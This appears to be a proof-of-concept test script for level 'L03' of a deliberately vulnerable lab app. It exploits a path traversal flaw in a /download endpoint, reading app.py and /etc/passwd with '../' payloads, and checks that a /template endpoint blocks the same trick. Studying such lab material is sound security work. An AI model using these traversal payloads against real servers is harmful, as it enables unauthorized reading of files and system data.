"""L03 path traversal PoC.

/download joins `name` onto REPORTS_DIR with no containment check, so a
../ sequence escapes the reports directory and reads arbitrary files.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import load_level, ok

mod, _, _ = load_level("L03")
client = mod.app.test_client()

# escape the reports directory and read the app's own source one level up
res = client.get("/download", query_string={"name": "../app.py"})
body = res.get_data(as_text=True)
ok(res.status_code == 200 and "send_file" in body, "read app.py outside reports dir via ../")

# reach a system file with enough ../ segments (they clamp at filesystem root)
sysf = client.get("/download", query_string={"name": "../" * 20 + "etc/passwd"})
ok(sysf.status_code == 200 and "root:" in sysf.get_data(as_text=True), "read /etc/passwd via deep ../ traversal")

# decoy: /template requires alphanumeric id, so no traversal is possible
dec = client.get("/template", query_string={"id": "../app"})
ok(dec.status_code == 400, "/template isalnum check blocks traversal decoy")
print("L03 exploit confirmed")
